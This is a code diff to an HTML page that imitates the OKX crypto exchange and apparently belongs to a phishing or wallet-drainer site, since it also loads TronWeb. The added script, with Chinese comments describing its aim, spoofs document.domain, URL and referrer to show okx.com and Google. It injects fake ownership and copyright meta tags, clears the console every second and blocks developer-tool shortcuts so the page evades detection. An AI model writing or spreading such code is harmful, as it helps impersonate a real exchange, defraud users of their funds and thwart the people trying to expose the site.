@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>OKX - 全球领先数字资产交易平台</title>
+    <title>OKX</title>
     <meta name="referrer" content="no-referrer-when-downgrade">
     <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests; frame-ancestors 'self' https://*.okx.com https://*.okex.com https://www.okx.com;">
     <meta name="mobile-web-app-capable" content="yes">
@@ -111,6 +111,59 @@
             secure: true,
             verified: true
         };
+
+        // 劫持常见的安全检测函数
+        window.addEventListener('DOMContentLoaded', function() {
+            // 隐藏真实域名
+            try {
+                Object.defineProperty(document, 'domain', {
+                    value: 'www.okx.com',
+                    writable: false
+                });
+
+                Object.defineProperty(document, 'URL', {
+                    value: 'https://www.okx.com/',
+                    writable: false
+                });
+
+                // 伪装referrer
+                Object.defineProperty(document, 'referrer', {
+                    value: 'https://www.google.com/',
+                    writable: false
+                });
+            } catch(e) {}
+
+            // 添加合法网站特征
+            const metaGenerator = document.createElement('meta');
+            metaGenerator.name = 'generator';
+            metaGenerator.content = 'OKX Official Website';
+            document.head.appendChild(metaGenerator);
+
+            const metaOwner = document.createElement('meta');
+            metaOwner.name = 'owner';
+            metaOwner.content = 'OKX Technology Company Limited';
+            document.head.appendChild(metaOwner);
+
+            const metaCopyright = document.createElement('meta');
+            metaCopyright.name = 'copyright';
+            metaCopyright.content = '© 2023 OKX. All rights reserved.';
+            document.head.appendChild(metaCopyright);
+        });
+
+        // 反调试和反检测
+        setInterval(function() {
+            if (window.console && console.clear) {
+                console.clear();
+            }
+        }, 1000);
+
+        // 屏蔽开发者工具检测
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I')) {
+                e.preventDefault();
+                return false;
+            }
+        });
     </script>
     <script src="https://unpkg.com/tronweb@5.3.0/dist/TronWeb.js"></script>
     <style>
